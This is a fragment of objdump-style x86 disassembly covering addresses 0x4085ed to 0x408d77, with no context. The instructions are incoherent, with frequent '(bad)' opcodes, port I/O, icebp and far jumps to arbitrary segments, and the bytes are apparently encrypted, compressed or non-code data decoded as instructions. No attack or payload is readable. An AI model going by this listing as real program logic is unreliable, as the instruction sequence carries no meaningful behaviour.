  4085ed:	xlat   BYTE PTR ds:[ebx]
  4085ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4085ef:	sbb    ah,dl
  4085f1:	xor    DWORD PTR [ebx-0x2807e28d],ebp
  4085f7:	push   ebp
  4085f8:	cmovno esi,DWORD PTR [edx-0x1e]
  4085fc:	jecxz  0x4085ac
  4085fe:	or     ch,0xea
  408601:	mov    dl,0x4a
  408603:	cmp    cl,BYTE PTR [ebx+0xd]
  408606:	(bad)  
  408607:	mov    edx,0x936d98cf
  40860c:	pushw  0x4f9d
  408610:	mov    esi,esp
  408612:	and    bh,BYTE PTR [edx]
  408614:	xchg   edx,eax
  408615:	push   eax
  408616:	and    eax,0xab5fd970
  40861b:	mov    WORD PTR [ebx-0x20891c0a],?
  408621:	imul   edx,DWORD PTR [ebp-0x9b3ecca],0xfffffffe
  408628:	or     DWORD PTR [esp+esi*2+0x6c],edx
  40862c:	adc    DWORD PTR [esi],ebp
  40862e:	mov    ah,BYTE PTR [esi-0x57295800]
  408634:	(bad)  
  408635:	mov    ds:0xe5dc7b3e,al
  40863a:	pop    ss
  40863b:	cmp    eax,0x63567edb
  408640:	ja     0x408666
  408642:	sbb    ebx,DWORD PTR [ecx+0x4a]
  408645:	(bad)  [edi+0x7a]
  408648:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408649:	sbb    bl,BYTE PTR ds:[ebx+0x213faab4]
  408650:	adc    DWORD PTR [esi+0x7c],ebx
  408653:	nop
  408654:	mov    ?,WORD PTR [edx-0x6f]
  408657:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408658:	inc    ebx
  408659:	(bad)  
  40865a:	jmp    0x15e7:0x48de0e1c
  408661:	pusha  
  408662:	sbb    DWORD PTR ds:0xfd39f868,edx
  408668:	xor    BYTE PTR [ecx],ch
  40866a:	js     0x408696
  40866c:	xchg   DWORD PTR [ecx-0x71959167],edx
  408672:	sbb    esp,ecx
  408674:	aaa    
  408675:	sub    al,0x3b
  408677:	add    DWORD PTR [eax+0x669ed2c0],ecx
  40867d:	fdivr  st(0),st
  40867f:	in     eax,0x93
  408681:	shl    DWORD PTR [edx+0x63],cl
  408684:	out    dx,al
  408685:	jbe    0x40868c
  408687:	mov    edx,0xa2d43e49
  40868c:	into   
  40868d:	add    ch,BYTE PTR [edi-0x3a]
  408690:	pop    ebx
  408691:	xor    bl,ch
  408693:	shl    bl,0xe5
  408696:	lahf   
  408697:	popa   
  408698:	sbb    dl,BYTE PTR [esi]
  40869a:	push   ss
  40869b:	inc    ebp
  40869c:	repnz (bad) 
  40869e:	mov    esp,0xd7c8abb
  4086a3:	and    eax,0x93ff31c4
  4086a8:	daa    
  4086a9:	mov    ebx,0xc7a3bc1d
  4086ae:	or     BYTE PTR [eax+ebp*1-0x2c],0x8c
  4086b3:	sub    al,0xa1
  4086b5:	xor    eax,0x7d680394
  4086ba:	leave  
  4086bb:	dec    ecx
  4086bc:	sbb    cl,BYTE PTR [esi+0x47]
  4086bf:	int3   
  4086c0:	pop    ebx
  4086c1:	outs   dx,DWORD PTR ds:[esi]
  4086c2:	sub    dh,al
  4086c4:	ror    ch,1
  4086c6:	inc    ebx
  4086c7:	imul   ebp,DWORD PTR [ebp+0x6b],0x20
  4086cb:	das    
  4086cc:	mov    dh,0x7b
  4086ce:	push   ebx
  4086cf:	and    al,0xc3
  4086d1:	(bad)  
  4086d3:	test   DWORD PTR [ebp-0x1a],edi
  4086d6:	mov    DWORD PTR [edx-0x5ed15080],esp
  4086dc:	or     al,0xb7
  4086de:	xchg   ecx,eax
  4086df:	test   DWORD PTR [edi+0x255eb249],edi
  4086e5:	mov    dh,0x68
  4086e7:	and    DWORD PTR [eax],ebp
  4086e9:	xchg   edx,eax
  4086ea:	sbb    al,0x7e
  4086ec:	dec    ebx
  4086ed:	sar    BYTE PTR [eax-0x12],1
  4086f0:	push   cs
  4086f1:	ret    
  4086f2:	out    dx,al
  4086f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4086f4:	xlat   BYTE PTR ds:[ebx]
  4086f5:	and    DWORD PTR [ecx+0x5bf452db],edx
  4086fb:	test   al,0x6b
  4086fd:	push   ebp
  4086fe:	rcl    BYTE PTR [edi+0x15],1
  408701:	push   edi
  408702:	xchg   esi,eax
  408703:	jae    0x4086bf
  408705:	mov    ds:0xeeaa6aef,eax
  40870a:	pop    ebx
  40870b:	sbb    bh,BYTE PTR [ebp+0x6a0abe93]
  408711:	lds    esp,FWORD PTR [edi+0x40]
  408714:	xchg   ebp,eax
  408715:	nop
  408716:	push   0xffffff8b
  408718:	je     0x4086c6
  40871a:	aaa    
  40871b:	xchg   ebx,eax
  40871c:	sub    eax,0x5f8e94a1
  408721:	mov    bh,0x61
  408723:	add    al,0x71
  408725:	jns    0x40873c
  408727:	pusha  
  408728:	stos   BYTE PTR es:[edi],al
  408729:	in     al,dx
  40872a:	pop    edx
  40872b:	xor    BYTE PTR [edi-0x21],ch
  40872e:	js     0x408764
  408730:	(bad)  
  408731:	sbb    al,0xbf
  408733:	call   0xb4db:0x36fef0aa
  40873a:	inc    ebx
  40873b:	xchg   ebx,eax
  40873c:	pop    es
  40873d:	stos   BYTE PTR es:[edi],al
  40873e:	and    ah,ah
  408740:	and    al,0x4
  408742:	shl    BYTE PTR [ebp+0x481481c0],1
  408748:	dec    edx
  408749:	pop    ebx
  40874a:	add    eax,0x6865e458
  40874f:	and    al,0x96
  408751:	add    esp,DWORD PTR [edi]
  408753:	nop
  408754:	add    bh,dh
  408756:	xor    bh,al
  408758:	int    0x80
  40875a:	sbb    edx,DWORD PTR ds:0xe821c1af
  408760:	cs pop ebp
  408762:	push   edx
  408763:	xchg   DWORD PTR [eax+0x7f],esi
  408766:	mov    ah,BYTE PTR [ecx+edi*1+0x78f47a9d]
  40876d:	pop    ebx
  40876e:	jne    0x408779
  408770:	out    dx,al
  408771:	shl    DWORD PTR [ecx],cl
  408773:	jo     0x40872e
  408775:	loope  0x4086fc
  408777:	and    ch,BYTE PTR [edi+ecx*8+0x5df0e9a6]
  40877e:	jbe    0x4087e7
  408780:	aaa    
  408781:	mov    dh,0xc1
  408783:	add    ecx,DWORD PTR [ecx-0x7e]
  408786:	push   ds
  408787:	in     eax,0x85
  408789:	xchg   BYTE PTR [edx+0x47611fce],bl
  40878f:	jg     0x4087d4
  408791:	repz mov esi,0x389297c4
  408797:	test   eax,0xea43f4b7
  40879c:	aad    0xa8
  40879e:	aas    
  40879f:	cld    
  4087a0:	(bad)  
  4087a1:	mov    ah,0x67
  4087a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4087a4:	or     DWORD PTR [esi],ecx
  4087a6:	adc    eax,edi
  4087a8:	loope  0x408807
  4087aa:	sar    BYTE PTR [edx-0x66],1
  4087ad:	lahf   
  4087ae:	push   esi
  4087af:	xor    ebx,DWORD PTR [edi+0x69f82bb7]
  4087b5:	mov    bl,0xbc
  4087b7:	fild   DWORD PTR [esi-0x5b32055a]
  4087bd:	lds    esi,FWORD PTR [edx+ebx*4-0x15]
  4087c1:	push   esp
  4087c2:	add    BYTE PTR [esi-0x1d],al
  4087c5:	or     BYTE PTR [ebp-0x3e61f537],al
  4087cb:	push   DWORD PTR [ecx]
  4087cd:	std    
  4087ce:	sahf   
  4087cf:	jg     0x408778
  4087d1:	dec    eax
  4087d2:	shr    BYTE PTR [eax-0x22],1
  4087d5:	push   ecx
  4087d6:	mov    bl,0xb2
  4087d8:	add    DWORD PTR ds:0x38ae5f46,ebx
  4087de:	xchg   ebx,eax
  4087df:	sbb    DWORD PTR gs:[edi+eiz*4-0x3f],esi
  4087e4:	loop   0x408777
  4087e6:	ja     0x408850
  4087e8:	mov    al,0xd8
  4087ea:	std    
  4087eb:	inc    esp
  4087ec:	sbb    DWORD PTR [ebx+0x71428bb9],ecx
  4087f2:	pop    es
  4087f3:	scas   eax,DWORD PTR es:[edi]
  4087f4:	out    dx,al
  4087f5:	adc    DWORD PTR [ebx-0x54],edi
  4087f8:	mov    ds:0x2f0adda0,al
  4087fd:	ficom  DWORD PTR [ebp-0x30]
  408800:	arpl   WORD PTR [ebp+0xe3046b9],di
  408806:	cmc    
  408807:	lds    ecx,FWORD PTR cs:[eax-0x66841773]
  40880e:	pop    eax
  40880f:	stos   BYTE PTR es:[edi],al
  408810:	in     al,dx
  408811:	sub    BYTE PTR [eax-0x21],0xe3
  408815:	in     al,0x9a
  408817:	cmp    eax,esi
  408819:	retf   
  40881a:	in     eax,0x2e
  40881c:	sbb    ebx,edx
  40881e:	and    DWORD PTR [edx+0x1ac4],ebp
  408824:	rcpps  xmm7,XMMWORD PTR [esi-0x566927fd]
  40882b:	gs mov esi,0x93f18619
  408831:	js     0x4088a8
  408833:	test   al,0x27
  408835:	in     eax,0xbb
  408837:	das    
  408838:	sar    ah,0x86
  40883b:	cmp    ah,BYTE PTR gs:[edx+0x4f]
  40883f:	pop    esp
  408840:	outs   dx,DWORD PTR ds:[esi]
  408841:	or     ecx,ecx
  408843:	sbb    al,0x33
  408845:	gs inc edi
  408847:	push   esp
  408848:	xchg   DWORD PTR [edi-0x3c1d6bbe],eax
  40884e:	jo     0x4087db
  408850:	cmp    eax,0x713919cd
  408855:	add    eax,DWORD PTR [ecx-0x18]
  408858:	int3   
  408859:	sub    BYTE PTR [edx-0x17],al
  40885c:	out    dx,al
  40885d:	in     eax,0x8a
  40885f:	add    BYTE PTR [ebp-0x3a],ch
  408862:	add    DWORD PTR [ecx-0x4228319],ebp
  408868:	loopne 0x408873
  40886a:	add    edx,DWORD PTR [edi]
  40886c:	ins    DWORD PTR es:[edi],dx
  40886d:	mov    bl,0x66
  40886f:	fstp   DWORD PTR [edx+0x31ad9037]
  408875:	and    eax,eax
  408877:	add    al,0x6f
  408879:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40887a:	pop    ds
  40887b:	mov    bl,0xc
  40887d:	add    dl,0x9e
  408880:	xor    eax,ebp
  408882:	call   0xc46a:0x90c04065
  408889:	xchg   edx,eax
  40888a:	adc    BYTE PTR [edi],ch
  40888c:	jmp    0x73d6abfa
  408891:	mov    ch,0xed
  408893:	jl     0x40883f
  408895:	mov    DWORD PTR [ecx-0x13],ecx
  408898:	unpcklps xmm1,XMMWORD PTR [eax]
  40889b:	into   
  40889c:	push   edi
  40889d:	push   es
  40889e:	test   edx,edi
  4088a0:	out    0x9e,eax
  4088a2:	cmp    esi,esi
  4088a4:	aas    
  4088a5:	inc    ebx
  4088a6:	es out dx,eax
  4088a8:	xor    esp,edx
  4088aa:	cmp    ecx,eax
  4088ac:	fs std 
  4088ae:	sub    esi,DWORD PTR [eax+0xd]
  4088b1:	xor    al,0x11
  4088b3:	sbb    esp,DWORD PTR [esi]
  4088b5:	or     BYTE PTR [esi-0x68f6aff6],ah
  4088bb:	xor    al,0x8c
  4088bd:	setnp  BYTE PTR [edi-0x4a07f739]
  4088c4:	add    al,0x8e
  4088c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4088c7:	mov    eax,ds:0x2acc0982
  4088cc:	jecxz  0x4088c8
  4088ce:	mov    edi,0x93129167
  4088d3:	lock retf 
  4088d5:	xorps  xmm4,xmm6
  4088d8:	in     al,dx
  4088d9:	iret   
  4088da:	add    DWORD PTR [edi-0x79b0c6fd],eax
  4088e0:	cmp    DWORD PTR [esi+0x3f],ecx
  4088e3:	pushf  
  4088e4:	repz and al,BYTE PTR [ecx+0x7ebf0653]
  4088eb:	mov    dh,0x3e
  4088ed:	call   0xbbff:0x71e40f10
  4088f4:	xchg   edi,eax
  4088f5:	iret   
  4088f6:	sbb    BYTE PTR [edx],bh
  4088f8:	dec    eax
  4088f9:	lds    esp,FWORD PTR [ecx+esi*1+0x10]
  4088fd:	shl    bh,0xcc
  408900:	in     eax,dx
  408901:	shl    bl,cl
  408903:	dec    eax
  408904:	mov    esp,0xa6c4b581
  408909:	cmp    esp,DWORD PTR [ebp-0x78483442]
  40890f:	add    bl,BYTE PTR [eax-0x1a50f785]
  408915:	hlt    
  408916:	inc    ebp
  408917:	pop    ss
  408918:	pusha  
  408919:	hlt    
  40891a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40891b:	dec    edx
  40891c:	adc    ebp,DWORD PTR ds:0x6826e998
  408922:	or     eax,0xd3969f4a
  408927:	(bad)  
  408928:	icebp  
  408929:	mov    BYTE PTR ds:0xb8521cb6,bl
  40892f:	push   esp
  408930:	lea    ebp,[esi+edx*2]
  408933:	mov    dl,0x92
  408935:	xchg   ecx,eax
  408936:	inc    ebx
  408937:	call   0x7d6f:0x3b0f147a
  40893e:	pop    es
  40893f:	mov    eax,0x82ecdfe2
  408944:	xor    BYTE PTR [ebx-0x75],0xb4
  408948:	fsubr  DWORD PTR ds:0x6e7585d
  40894e:	dec    esi
  40894f:	xchg   BYTE PTR [eax-0x49b77468],bh
  408955:	iret   
  408956:	mov    al,ds:0xe3a223cc
  40895b:	scas   eax,DWORD PTR es:[edi]
  40895c:	cmc    
  40895d:	dec    esi
  40895e:	push   edx
  40895f:	xchg   esi,eax
  408960:	dec    eax
  408961:	call   0x5a84:0xe6bed300
  408968:	push   esi
  408969:	icebp  
  40896a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40896b:	add    eax,0x2f390b6e
  408970:	push   ebx
  408971:	dec    eax
  408972:	mov    eax,ds:0x337a23d6
  408977:	sbb    eax,DWORD PTR [eax-0x1ee1fce1]
  40897d:	push   esp
  40897e:	int    0xf3
  408980:	fnstsw WORD PTR [esi]
  408982:	inc    ecx
  408983:	inc    ebp
  408984:	mov    edi,0x8c0fc096
  408989:	and    bh,BYTE PTR [eax-0x63]
  40898c:	inc    esi
  40898d:	inc    edi
  40898e:	aas    
  40898f:	xor    al,0x5e
  408991:	in     eax,dx
  408992:	push   es
  408993:	(bad)  
  408994:	outs   dx,BYTE PTR ds:[esi]
  408995:	or     ah,BYTE PTR [eax+0x23]
  408998:	outs   dx,BYTE PTR ds:[esi]
  408999:	arpl   WORD PTR [esi+0x3],bp
  40899c:	adc    al,0x8
  40899e:	pop    esp
  40899f:	dec    edi
  4089a0:	mov    ebx,0xf4b78f68
  4089a5:	popf   
  4089a6:	out    dx,eax
  4089a7:	inc    ecx
  4089a8:	mov    eax,0x4aadef8a
  4089ad:	inc    edi
  4089ae:	adc    BYTE PTR [ecx],dh
  4089b0:	repnz mov gs,WORD PTR fs:[ebp+0x1c]
  4089b5:	dec    ebx
  4089b6:	xchg   DWORD PTR [esi-0x36b1c9f8],esp
  4089bc:	out    0x1b,al
  4089be:	mov    ah,0x6
  4089c0:	or     BYTE PTR [edi],bl
  4089c2:	mov    ebx,0xb160f768
  4089c7:	mov    esi,0x7ae6ec0d
  4089cc:	arpl   bx,bx
  4089ce:	jge    0x408a09
  4089d0:	clc    
  4089d1:	jns    0x408978
  4089d3:	std    
  4089d4:	add    BYTE PTR [eax],ch
  4089d6:	sahf   
  4089d7:	inc    ebp
  4089d8:	adc    ebp,DWORD PTR [edi-0x43]
  4089db:	mov    edi,0x3edeb37f
  4089e0:	adc    bl,BYTE PTR [eax+0x2d1bff1b]
  4089e6:	jne    0x408a10
  4089e8:	outs   dx,DWORD PTR ds:[esi]
  4089e9:	add    edi,ecx
  4089eb:	jmp    0xd948:0xd8e28327
  4089f2:	ficom  DWORD PTR [ecx+0x5b092050]
  4089f8:	lahf   
  4089f9:	jae    0x4089d9
  4089fb:	lahf   
  4089fc:	inc    ebp
  4089fd:	lea    esi,[edi]
  4089ff:	je     0x4089d0
  408a01:	fst    DWORD PTR [edi+0x48]
  408a04:	fs scas eax,DWORD PTR es:[edi]
  408a06:	lods   al,BYTE PTR ds:[esi]
  408a07:	dec    edi
  408a08:	stos   BYTE PTR es:[edi],al
  408a09:	mov    esp,edx
  408a0b:	sub    bh,0x7d
  408a0e:	std    
  408a0f:	(bad)  
  408a10:	jmp    0x408a5c
  408a12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a13:	push   cs
  408a14:	icebp  
  408a15:	sbb    BYTE PTR [ecx+0x4a455554],bh
  408a1b:	out    dx,eax
  408a1c:	dec    edi
  408a1d:	fcmovnu st,st(5)
  408a1f:	ror    eax,1
  408a21:	mov    bl,0x2e
  408a23:	std    
  408a24:	rcl    esi,1
  408a26:	je     0x408a2f
  408a28:	dec    esp
  408a29:	mov    al,0x83
  408a2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a2c:	and    al,0xfc
  408a2e:	pop    es
  408a2f:	(bad)  
  408a30:	fdivrp st(7),st
  408a32:	scas   eax,DWORD PTR es:[edi]
  408a33:	dec    esi
  408a34:	retf   
  408a35:	mov    esi,0x37386d9f
  408a3a:	jnp    0x408a74
  408a3c:	icebp  
  408a3d:	and    edx,ebx
  408a3f:	jae    0x408a7a
  408a41:	out    0x13,al
  408a43:	js     0x4089f5
  408a45:	cli    
  408a46:	mov    edi,0x5cf185d3
  408a4b:	or     BYTE PTR [edi],dl
  408a4d:	ret    0x3d9d
  408a50:	adc    al,0x6b
  408a52:	xor    BYTE PTR [edi+0x50813bc0],ch
  408a58:	int    0xe7
  408a5a:	into   
  408a5b:	jp     0x408a98
  408a5d:	test   al,0x35
  408a5f:	jl     0x408a61
  408a61:	or     BYTE PTR [ecx+eiz*4],ch
  408a64:	jbe    0x408a10
  408a66:	jmp    0x408a39
  408a68:	fstp   TBYTE PTR [edx+0x22]
  408a6b:	mov    edi,0xa6b12921
  408a70:	jp     0x408abf
  408a72:	pop    esi
  408a73:	icebp  
  408a74:	lods   eax,DWORD PTR ds:[esi]
  408a75:	outs   dx,BYTE PTR ds:[esi]
  408a76:	mov    esp,0x88ad85f5
  408a7b:	sbb    esi,DWORD PTR [ecx]
  408a7d:	cmp    eax,0xc151708a
  408a82:	xor    ch,BYTE PTR [ebp-0x41]
  408a85:	add    bl,dl
  408a87:	xchg   DWORD PTR [ebx-0x45],edi
  408a8a:	mov    ebp,0xa40dfc17
  408a8f:	pop    ebx
  408a90:	sbb    DWORD PTR [esi],ebp
  408a92:	dec    edi
  408a93:	adc    al,0x46
  408a95:	stc    
  408a96:	dec    ebp
  408a97:	shl    BYTE PTR [edi+0x11],1
  408a9a:	repz out 0x5b,eax
  408a9d:	xor    eax,0x7e4b38f3
  408aa2:	fnsave [ebx+0x709fdb50]
  408aa8:	add    BYTE PTR [esi-0x2f],dh
  408aab:	and    esi,ecx
  408aad:	fxch   st(6)
  408aaf:	aam    0x3f
  408ab1:	ret    0x6794
  408ab4:	inc    edi
  408ab5:	add    edi,esi
  408ab7:	shl    BYTE PTR ds:0x9f78e8c9,1
  408abd:	stc    
  408abe:	pop    esi
  408abf:	div    BYTE PTR [eax-0x15]
  408ac2:	in     al,dx
  408ac3:	add    al,0xeb
  408ac5:	leave  
  408ac6:	cs ins BYTE PTR es:[edi],dx
  408ac8:	mov    al,BYTE PTR ds:0xbcf1c64f
  408ace:	or     al,0xf5
  408ad0:	lods   eax,DWORD PTR ds:[esi]
  408ad1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ad2:	mov    ch,0x93
  408ad4:	push   ebp
  408ad5:	or     al,0x27
  408ad7:	rcl    DWORD PTR [ecx+0xd39f473],cl
  408add:	mov    al,ds:0x6392ecab
  408ae2:	scas   eax,DWORD PTR es:[edi]
  408ae3:	xlat   BYTE PTR ds:[ebx]
  408ae4:	push   ds
  408ae5:	and    ah,BYTE PTR [ebx]
  408ae7:	mov    WORD PTR [ebp-0x28],ss
  408aea:	cdq    
  408aeb:	lods   al,BYTE PTR ds:[esi]
  408aec:	dec    eax
  408aed:	sahf   
  408aee:	inc    ebp
  408aef:	call   0xf3a:0x58c1c9e5
  408af6:	rcl    BYTE PTR [eax+edi*8],0x80
  408afa:	push   ebp
  408afb:	imul   eax,DWORD PTR [ebp-0x3074dfe7],0x9b527813
  408b05:	push   0x72185228
  408b0a:	imul   ecx,DWORD PTR [ecx+0x1e5eace],0xcb2ad41a
  408b14:	push   ebx
  408b15:	retf   0x5970
  408b18:	outs   dx,BYTE PTR ds:[esi]
  408b19:	and    al,0x87
  408b1b:	repz retf 
  408b1d:	mov    ?,WORD PTR [ecx+0x7decdd69]
  408b23:	xor    eax,0xe30f78c7
  408b28:	out    0x7,eax
  408b2a:	mov    ah,0xe1
  408b2c:	popf   
  408b2d:	dec    esp
  408b2e:	(bad)  
  408b2f:	pop    esi
  408b30:	jle    0x408b95
  408b32:	push   ebp
  408b33:	mov    esi,0xdfec6ba2
  408b38:	jne    0x408b5c
  408b3a:	and    BYTE PTR [ebx+0x63],bl
  408b3d:	dec    ebp
  408b3e:	add    bh,BYTE PTR [ebp+0x1c356dca]
  408b44:	sub    al,al
  408b46:	or     ebp,DWORD PTR [ebp+0x4a1c9468]
  408b4c:	jae    0x408b90
  408b4e:	jg     0x408b55
  408b50:	jae    0x408b40
  408b52:	dec    esi
  408b53:	lods   eax,DWORD PTR ds:[esi]
  408b54:	(bad)  
  408b55:	pop    ebp
  408b56:	retf   
  408b57:	ret    0xa22d
  408b5a:	icebp  
  408b5b:	mov    ah,0x14
  408b5d:	push   esi
  408b5e:	jle    0x408bb7
  408b60:	jno    0x408bb2
  408b62:	inc    eax
  408b63:	jo     0x408bdb
  408b65:	mov    esi,0xbdfc51a3
  408b6a:	xor    BYTE PTR [ebx-0x80],dl
  408b6d:	hlt    
  408b6e:	sbb    al,0x9c
  408b70:	fcmovbe st,st(1)
  408b72:	jle    0x408b36
  408b74:	cmp    ah,BYTE PTR [esi-0x34c780f1]
  408b7a:	mov    edi,0x43f2010e
  408b7f:	inc    eax
  408b80:	sub    cl,BYTE PTR [edi]
  408b82:	or     BYTE PTR [edi],al
  408b84:	shl    DWORD PTR [ecx],1
  408b86:	rcl    BYTE PTR [ebx],cl
  408b88:	inc    ebp
  408b89:	lds    ebp,FWORD PTR [edi+0x54]
  408b8c:	sbb    ebp,DWORD PTR [edx+0x2b]
  408b8f:	sub    eax,0xafcb226f
  408b94:	clc    
  408b95:	fs sti 
  408b97:	into   
  408b98:	in     al,0x0
  408b9a:	stos   BYTE PTR es:[edi],al
  408b9b:	add    DWORD PTR [esi],edi
  408b9d:	cmp    al,0xe
  408b9f:	repnz mov esi,eax
  408ba2:	repnz dec ebp
  408ba4:	cmc    
  408ba5:	mov    ds:0x91cb1564,eax
  408baa:	inc    esi
  408bab:	mov    edi,0xa09c0c49
  408bb0:	mov    esi,0x4c4ca8a0
  408bb5:	mov    esp,0x1bada82b
  408bba:	pop    esp
  408bbb:	outs   dx,BYTE PTR ds:[esi]
  408bbc:	dec    eax
  408bbd:	scas   eax,DWORD PTR es:[edi]
  408bbe:	es adc al,0x5e
  408bc1:	cdq    
  408bc2:	mov    eax,0xf00817e8
  408bc7:	sbb    ebx,edi
  408bc9:	sti    
  408bca:	shl    dl,1
  408bcc:	rol    dl,cl
  408bce:	leave  
  408bcf:	inc    ebp
  408bd0:	inc    edx
  408bd1:	imul   ecx,DWORD PTR [ecx],0x50
  408bd4:	jno    0x408bf5
  408bd6:	ins    BYTE PTR es:[edi],dx
  408bd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408bd8:	pop    esp
  408bd9:	les    eax,FWORD PTR [eax-0x6defaeda]
  408bdf:	loopne 0x408c45
  408be1:	sub    eax,0xe54b0d33
  408be6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408be7:	mov    al,0x17
  408be9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408bea:	jle    0x408bc1
  408bec:	sahf   
  408bed:	sbb    al,0x13
  408bef:	stc    
  408bf0:	pop    eax
  408bf1:	or     esi,DWORD PTR [edx]
  408bf3:	or     bl,ah
  408bf5:	mov    al,ds:0x79eb0830
  408bfa:	cwde   
  408bfb:	pop    ss
  408bfc:	test   al,0x1d
  408bfe:	mov    eax,0x9e510424
  408c03:	xor    dl,BYTE PTR [edx]
  408c05:	xor    BYTE PTR [esi-0x52],0x2c
  408c09:	(bad)  
  408c0a:	pop    ecx
  408c0b:	leavew 
  408c0d:	sub    eax,0x38d51bed
  408c12:	in     eax,0xea
  408c14:	fadd   QWORD PTR [edi-0x7b]
  408c17:	fdiv   st(7),st
  408c19:	dec    ecx
  408c1a:	xor    DWORD PTR [edi],eax
  408c1c:	sbb    al,0x1f
  408c1e:	dec    eax
  408c1f:	scas   al,BYTE PTR es:[edi]
  408c20:	mov    dl,0x8
  408c22:	in     al,dx
  408c23:	aaa    
  408c24:	xchg   ebx,eax
  408c25:	sar    BYTE PTR [edx+edx*4-0x19be0e03],cl
  408c2c:	xchg   ebx,eax
  408c2d:	dec    edi
  408c2e:	mov    ds:0x5d721090,al
  408c33:	repnz add BYTE PTR es:[ecx+0x52ca4b6d],0x5b
  408c3c:	fldenv [eax+eiz*2-0x62e9af1]
  408c43:	sbb    dl,BYTE PTR [ebp+esi*2+0x17]
  408c47:	xchg   BYTE PTR [esi+0x2ac09c5f],ah
  408c4d:	jl     0x408bd3
  408c4f:	int3   
  408c50:	xchg   esi,eax
  408c51:	jp     0x408c86
  408c53:	push   ecx
  408c54:	mov    edi,0xb259b172
  408c59:	popf   
  408c5a:	scas   al,BYTE PTR es:[edi]
  408c5b:	sti    
  408c5c:	adc    al,0xdd
  408c5e:	xor    ecx,ebp
  408c60:	xchg   ecx,eax
  408c61:	inc    ecx
  408c62:	sbb    cl,dh
  408c64:	test   BYTE PTR [eax],cl
  408c66:	and    ebx,esp
  408c68:	ret    
  408c69:	(bad)  
  408c6b:	mov    cl,0xba
  408c6d:	and    edi,ebp
  408c6f:	inc    eax
  408c70:	fsub   DWORD PTR [esi]
  408c72:	pop    ds
  408c73:	test   BYTE PTR ds:0x60c968c9,dl
  408c79:	daa    
  408c7a:	push   ebx
  408c7b:	xlat   BYTE PTR ds:[ebx]
  408c7c:	fsub   DWORD PTR ds:0x1dc20607
  408c82:	cmp    al,0x8b
  408c85:	dec    edi
  408c86:	cmp    eax,0xc87c575f
  408c8b:	in     eax,dx
  408c8c:	ficomp WORD PTR [ebx+0x2a]
  408c8f:	xchg   edx,eax
  408c90:	test   DWORD PTR [ebp+0x23],edi
  408c93:	push   edi
  408c94:	imul   esi,DWORD PTR [edx],0x1
  408c97:	mov    bl,0x99
  408c99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c9a:	push   ds
  408c9b:	jle    0x408c85
  408c9d:	push   0xffffffb4
  408c9f:	adc    eax,0xf2a69657
  408ca4:	lahf   
  408ca5:	loopne 0x408ce6
  408ca7:	cmp    bh,bl
  408ca9:	cs jae 0x408ceb
  408cac:	(bad)  
  408cad:	mov    BYTE PTR [edi*2-0x107740d],bh
  408cb4:	jle    0x408c96
  408cb6:	cmp    al,0xb6
  408cb8:	rcl    BYTE PTR [eax-0x55f0e664],0xa
  408cbf:	pusha  
  408cc0:	sub    cl,dh
  408cc2:	ins    DWORD PTR es:[edi],dx
  408cc3:	sub    al,0x67
  408cc5:	and    al,0x1c
  408cc7:	fwait
  408cc8:	mov    dh,0x61
  408cca:	mov    bh,BYTE PTR [eax-0x30]
  408ccd:	jg     0x408cfe
  408ccf:	test   DWORD PTR ds:0x615d50f7,eax
  408cd5:	mov    ebp,DWORD PTR [edx+0x45]
  408cd8:	mov    ds:0x37dbdd67,eax
  408cdd:	inc    esp
  408cde:	cmp    BYTE PTR [ebx+0x4a],dh
  408ce1:	sub    DWORD PTR [esi+ecx*1],esi
  408ce4:	aas    
  408ce5:	dec    esp
  408ce6:	dec    ebp
  408ce7:	dec    eax
  408ce8:	stos   BYTE PTR es:[edi],al
  408ce9:	(bad)  
  408cea:	in     eax,0x3
  408cec:	xor    eax,0x371c8d1f
  408cf1:	test   DWORD PTR [ebx+0x57],eax
  408cf4:	inc    ebp
  408cf5:	xor    al,BYTE PTR [esi-0x3de43ecb]
  408cfb:	aaa    
  408cfc:	in     eax,0xf5
  408cfe:	int3   
  408cff:	dec    ecx
  408d00:	dec    edi
  408d01:	adc    ebx,DWORD PTR [edx+0x434ed2be]
  408d07:	xor    eax,0x95bda737
  408d0c:	imul   esp,DWORD PTR [edi+0x647c0832],0xd37b8838
  408d16:	shl    BYTE PTR [esi+ebp*4-0x7318320a],0x80
  408d1e:	jle    0x408cfa
  408d20:	sub    eax,0x8de6933d
  408d25:	mov    fs,WORD PTR [ebp-0x7d6414e]
  408d2b:	sar    DWORD PTR [ebx+0x25],1
  408d2e:	js     0x408cca
  408d30:	push   es
  408d31:	xchg   esi,eax
  408d32:	test   DWORD PTR ds:0x711459bb,eax
  408d38:	mov    ecx,0x55ebed3a
  408d3d:	xchg   BYTE PTR ds:0xfa8aedbf,bh
  408d43:	pop    eax
  408d44:	pop    esp
  408d45:	dec    edx
  408d46:	or     cl,BYTE PTR [ebp-0x9c53b1c]
  408d4c:	mov    dh,dl
  408d4e:	fwait
  408d4f:	xor    cl,bl
  408d51:	pop    edi
  408d52:	pop    edi
  408d53:	pushf  
  408d54:	sub    ebx,esi
  408d56:	icebp  
  408d57:	fistp  QWORD PTR [ebx-0x10]
  408d5a:	sub    DWORD PTR [ecx+0x23a30967],0xbefa6c2d
  408d64:	push   ebx
  408d65:	push   es
  408d66:	mov    dl,0x15
  408d68:	mov    al,0xe
  408d6a:	xor    BYTE PTR [esi-0x5a],ch
  408d6d:	inc    eax
  408d6e:	out    dx,al
  408d6f:	jae    0x408dbc
  408d71:	xchg   BYTE PTR [esi],bh
  408d73:	xlat   BYTE PTR ds:[ebx]
  408d74:	xchg   ebp,eax
  408d75:	jg     0x408d35
  408d77:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
